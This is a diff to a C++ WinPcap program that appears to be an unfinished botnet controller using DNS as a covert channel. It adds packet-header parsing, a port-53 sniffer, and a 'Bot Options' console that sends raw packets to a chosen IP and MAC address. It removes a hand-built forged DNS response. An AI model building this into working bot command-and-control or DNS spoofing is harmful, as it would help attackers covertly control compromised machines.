@@ -9,12 +9,47 @@
 #include "pcap.h"
 #include <bitset>
 #include <vector>
-#include <process.h>
+#include <Windows.h>
 
 #define MAX_THREADS 2
+CRITICAL_SECTION HandleLock;
 
 #pragma comment(lib, "ws2_32.lib") //WinSock lib
 #pragma comment(lib, "IPHLPAPI.lib") //IP Helper lib
+
+//contains the dns packet data
+typedef struct dns_payload {
+	u_char size;
+	u_char junk;
+	u_char junk2;
+}dns_payload;
+
+//dns header
+typedef struct dns_header {
+	u_short identifier;
+	u_short flags_codes;
+	u_short qcount;
+	u_short acount;
+	u_short nscount;
+	u_short arcount;
+}dns_header;
+
+// UDP header used for dns packets
+typedef struct udp_header {
+	u_short sport;          // Source port
+	u_short dport;          // Destination port
+	u_short len;            // Datagram length
+	u_short crc;            // Checksum
+}udp_header;
+
+/*
+*This struct will be used to decode Ethernet headers
+*/
+typedef struct eth_header {
+	u_char dest[6];
+	u_char src[6];
+	u_short type;
+}eth_header;
 
 //contains the values of mac address as integers
 typedef struct mac_values {
@@ -35,6 +70,23 @@ typedef struct ip_addr {
 }ip_addr;
 
 /*
+*This struct will be used to decapsulate ipv4 headers
+*/
+typedef struct IPv4 {
+	u_char  ver_ihl;        // Version (4 bits) + Internet header length (4 bits)
+	u_char  tos;            // Type of service 
+	u_short tlen;           // Total length 
+	u_short identification; // Identification
+	u_short flags_fo;       // Flags (3 bits) + Fragment offset (13 bits)
+	u_char  ttl;            // Time to live
+	u_char  proto;          // Protocol
+	u_short crc;            // Header checksum
+	ip_addr saddr;			// Source address
+	ip_addr  daddr;			// Destination address
+	u_int   op_pad;         // Option + Padding
+}IPv4;
+
+/*
 *This function will find the size of lists created by functions in wpdpack libs
 *list: should be the first point of a pcap interface list
 *returns: the size of the list parameter
@@ -44,7 +96,7 @@ int size_of_list(pcap_if_t*  list) {
 
 	//loops until d is NULL and counts elements
 	for (pcap_if_t* d = list; d != NULL; d = d->next) {
-		std::cout << "Printing device list" << std::endl << d->description << std::endl;
+		//std::cout << "Printing device list" << std::endl << d->description << std::endl;
 		size++;
 	}
 
@@ -198,13 +250,94 @@ void get_ip(std::vector<std::string>& ip_addresses) {
 }
 
 /*
- *Used to send packets to server using cc
+*This function will decapsulate packets
+*and call functions if needed
+*renturns nothing
+*/
+void decapsulate(const u_char *data, int size) {
+	eth_header* eth_hdr;
+	eth_hdr = (eth_header*)data;
+	IPv4* ih;
+	u_int head_len;
+	//tcp_head* th;
+	udp_header* uh;
+	u_short sport;
+	u_short dport;
+	dns_header* dns_h;
+	dns_payload* dns_pay;
+
+	if (ntohs(eth_hdr->type) == 0x800) {
+		// retireve the position of the ip header
+		ih = (IPv4 *)(data + 14); //length of ethernet header
+
+								  // print ip addresses
+		printf("%d.%d.%d.%d -> %d.%d.%d.%d\n",
+			ih->saddr.octet1,
+			ih->saddr.octet2,
+			ih->saddr.octet3,
+			ih->saddr.octet4,
+			ih->daddr.octet1,
+			ih->daddr.octet2,
+			ih->daddr.octet3,
+			ih->daddr.octet4);
+
+		//get tcp header
+		/*ip_head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
+		th = (tcp_head *)((u_char*)ih + ip_head_len);*/
+
+		//get udp header = pointer + length of ipheader
+		head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
+		uh = (udp_header *)((u_char*)ih + head_len);
+
+		//convert form network byte order to host byte order
+		sport = ntohs(uh->sport);
+		dport = ntohs(uh->dport);
+
+		std::cout << "source " << sport << "dest " << dport << "length " << head_len << std::endl;
+
+		//dns header = point + udp header
+		head_len = 8; //standard length of udp header is 8 bytes
+		dns_h = (dns_header *)((u_char*)uh + head_len);
+
+		//std::cout << "Identifier " << dns_h->identifier << std::endl;
+		printf("Identifier %2.2x", dns_h->identifier);
+		//determine if the packet is a response or request
+		std::bitset<16> id(dns_h->flags_codes);
+		std::cout << "QR: " << id[7] << std::endl;//bytes swap lsb
+		if (id[7] == 1) {
+			//dns payload= pointer + dns header size
+			head_len = 12;
+			dns_pay = (dns_payload *)((u_char*)dns_h + head_len);
+
+			u_char* domain_char = (u_char*)dns_h + head_len;
+			u_int index = 0;
+			//loop to the end of question field
+			while (*domain_char != 0) {
+				domain_char = (u_char*)dns_h + head_len + index;
+				std::cout << domain_char << std::endl;
+				index++;
+			}
+			std::cout << index << std::endl;
+			u_char* type = (u_char*)dns_pay + index + 1;//grab least sign bit
+			int lsb = (int)*type;
+			type = type - 1;//grab most sig bit
+			int msb = (int)*type;
+			msb = msb * 256;
+			int type_val = msb + lsb;
+			std::cout << "Type: " << type_val << std::endl;
+			//Use value returned by type for messages
+		}
+	}
+}
+
+/*
+ *Used to send ip packets
+ *returns: success of packet being sent
  */
-int send_packet(pcap_t* fp) {
+int send_packet(std::string address, std::string mac_addr) {
 	mac_values* values = (mac_values*)malloc((sizeof(int) * 6));
 	get_mac(&values);
-	u_char packet[102];
-
+	u_char packet[34];
 
 	////////get gateway ip address///////////
 	//arp -a > "C:\Path to file
@@ -281,104 +414,7 @@ int send_packet(pcap_t* fp) {
 	packet[32] = ip_address->octet3;
 	packet[33] = ip_address->octet4;
 	free(ip_address);
-
-	//UDP Header
-	//source port
-	packet[34] = 0;
-	packet[35] = 53;
-	//destination port
-	packet[36] = 0;
-	packet[37] = 53;
-	//length in bytes of udp header
-	packet[38] = 0;
-	packet[39] = 68;
-	//checksum
-	packet[40] = 70;
-	packet[41] = 70;
-
-	//DNS Header
-	//id
-	packet[42] = 54;
-	packet[43] = 54;
-	//flags and opcodes
-	//128: response 0: standard query 0: not authority 0: truncate bit 0: recursion desired
-	packet[44] = 128;
-	//0: recusion available 0: z bit 0: authentication data 0: checking disabled 0: reply code
-	packet[45] = 0;
-	//total questions
-	packet[46] = 0;
-	packet[47] = 1;
-	//total answers
-	packet[48] = 0;
-	packet[49] = 1;
-	/////////////////ERROR WITH ORDER////////////////////
-	//authority rr
-	packet[50] = 0;
-	packet[51] = 0;
-	//additional rr
-	packet[52] = 0;
-	packet[53] = 0;
 	
-	//DNS Response Question and Answer
-	//Query Name www.hello.com
-	packet[54] = 3;
-	packet[55] = 119;
-	packet[56] = 119;
-	packet[57] = 119;
-	packet[58] = 5;
-	packet[59] = 104;
-	packet[60] = 101;
-	packet[61] = 108;
-	packet[62] = 108;
-	packet[63] = 111;
-	packet[64] = 3;
-	packet[65] = 99;
-	packet[66] = 111;
-	packet[67] = 109;
-	packet[68] = 0;
-	//type
-	packet[69] = 0;
-	packet[70] = 60;
-	//class
-	packet[71] = 0; 
-	packet[72] = 1; //internet
-	//Answer
-	//Name www.hello.com
-	packet[73] = 3;
-	packet[74] = 119;
-	packet[75] = 119;
-	packet[76] = 119;
-	packet[77] = 5;
-	packet[78] = 104;
-	packet[79] = 101;
-	packet[80] = 108;
-	packet[81] = 108;
-	packet[82] = 111;
-	packet[83] = 3;
-	packet[84] = 99;
-	packet[85] = 111;
-	packet[86] = 109;
-	packet[87] = 0;
-	//type
-	packet[88] = 0;
-	packet[89] = 60;
-	//class
-	packet[90] = 0;
-	packet[91] = 1;//internet
-	//time to live
-	packet[92] = 0;
-	packet[93] = 0;
-	packet[94] = 0;
-	packet[95] = 255;
-	//rdata length
-	packet[96] = 0;
-	packet[97] = 4;
-	//data ip address
-	packet[98] = 192;
-	packet[99] = 168;
-	packet[100] = 1;
-	packet[101] = 1;
-
 	/* Fill the rest of the packet 
 	for (int i = 97;i<100;i++)
 	{
@@ -386,47 +422,129 @@ int send_packet(pcap_t* fp) {
 	}*/
 
 	/* Send down the packet */
-	if (pcap_sendpacket(fp, packet, 102 /* size */) != 0)
-	{
-		std::cout << "\nError sending the packet: \n" << pcap_geterr(fp) << std::endl;
+	EnterCriticalSection(&HandleLock);
+	pcap_if_t* first_device;
+	pcap_t* fp = get_handle(&first_device);
+	if (fp == NULL) {
+		LeaveCriticalSection(&HandleLock);
 		return -1;
 	}
-	/////////////////////////////////////////////////////////////
+	if (pcap_sendpacket(fp, packet, 34 /* size */) != 0)
+	{
+		std::cout << "\nError sending the packet: \n" << pcap_geterr(fp) << std::endl;
+		LeaveCriticalSection(&HandleLock);
+		return -1;
+	}
+	LeaveCriticalSection(&HandleLock);
+	
 	return 0;
 }
 
 /*
- *function will contain capture code
- *return:
+ *This is the server interface for send packets
+ *returns: success of operation
  */
-void capture(void* id) {
-	for (int i = 0; i < 6; i++) {
-		std::cout << i << std::endl;
+DWORD WINAPI command_console(PVOID pPARAM) {
+	//Variables
+	std::string option = "";
+	std::string address = "";
+	std::string mac_addr = "";
+
+	//create interface
+	printf("Bot Options:\n1:Get Data\n2:Enter Commands\n");
+	std::cin >> option;
+	printf("Enter IP Address or 1 to List Bots:\n");
+	std::cin >> address;
+	printf("Enter MAC Address or 1 to List Bots:\n");
+	std::cin >> mac_addr;
+	if (address == "1" || mac_addr == "1") {
+		address = "";
+		mac_addr = "";
+		//////List address function//////
+		printf("Enter IP Address:\n");
+		std::cin >> address;
+		printf("Enter MAC Address:\n");
+		std::cin >> mac_addr;
+		send_packet(address, mac_addr);
 	}
+	else 
+		send_packet(address, mac_addr);
+
+	return 0;
+}
+
+/*
+ *function will take an object containing a interface handle
+ *which will be used to open a capturing session on that int
+ *returns: unsigned int to help show how the thread completed execution
+ */
+DWORD WINAPI capture(PVOID pPARAM) {
+	//add any code that does not require critical sect
+
+	/////////////beginning of critical section/////////////
+	EnterCriticalSection(&HandleLock);
+	//device is pointer to list of devices
+	pcap_if_t* first_device;			//pointer to first device in the list
+	pcap_t* adhandle = get_handle(&first_device);	//handle of interface
+	if (adhandle == NULL) {
+		LeaveCriticalSection(&HandleLock);
+		return -1;
+	}
+	struct bpf_program opcode;			//this will contain useful shit
+	u_int netmask;						//this will contain the netmask of the interface capturing
+	netmask = ((struct sockaddr_in*) (first_device->addresses->netmask))->sin_addr.S_un.S_addr;
+	if (pcap_compile(adhandle, &opcode, "ip proto \\udp and port 53", 1, netmask) < 0) {
+		pcap_freealldevs(first_device);
+		LeaveCriticalSection(&HandleLock);
+		return -1;
+	}
+
+	//set filter
+	if (pcap_setfilter(adhandle, &opcode) < 0) {
+		pcap_freealldevs(first_device);
+		LeaveCriticalSection(&HandleLock);
+		return -1;
+	}
+	pcap_freealldevs(first_device);
+	LeaveCriticalSection(&HandleLock);
+	/////////////end of critical section//////////////////
+
+
+	//capture packets on dev
+	struct pcap_pkthdr *pktHeader;		//stores packet header information
+	const u_char *pkt_data;				//stores packet data
+	/////////infinite loop need to change///////////
+	while (pcap_next_ex(adhandle, &pktHeader, &pkt_data) >-1) {
+
+		//inspect packet
+		if (pktHeader->len > 0) {
+			decapsulate(pkt_data, pktHeader->caplen);
+		}
+	}
+	///////////////////////////////////////////////
+
+	return 0;   // thread completed successfully
 }
 
 int main()
 {
-	//device is pointer to list of devices
-	/*pcap_if_t* first_device;
-	pcap_t* adhandle = get_handle(&first_device);
-	if (adhandle == NULL)
-		return -1;
-
+	InitializeCriticalSection(&HandleLock);
 	//captures packets using winpcap driver
 	//capture ip traffic
 
 	//send dns packets
-	if (send_packet(adhandle) == -1) {
+	/*if (send_packet(adhandle) == -1) {
 		return -1;
-	}
-	pcap_freealldevs(first_device);*/
+	}*/
+	
 
 	//trying the multithreaded prog
-	int threadNum = 1;
-	_beginthread(capture, 0, &threadNum);
-	//kill thread
-	threadNum--;
+	DWORD id;
+	//HANDLE hCapture = CreateThread(NULL, 0, capture, (PVOID)1, 0, &id);
+	HANDLE hSender = CreateThread(NULL, 0, command_console, (PVOID)2, 0, &id);
+	
+	//Wait for objects
+	WaitForSingleObject(hSender, INFINITE);
 
 	int temp = 0;
 	std::cin >> temp;
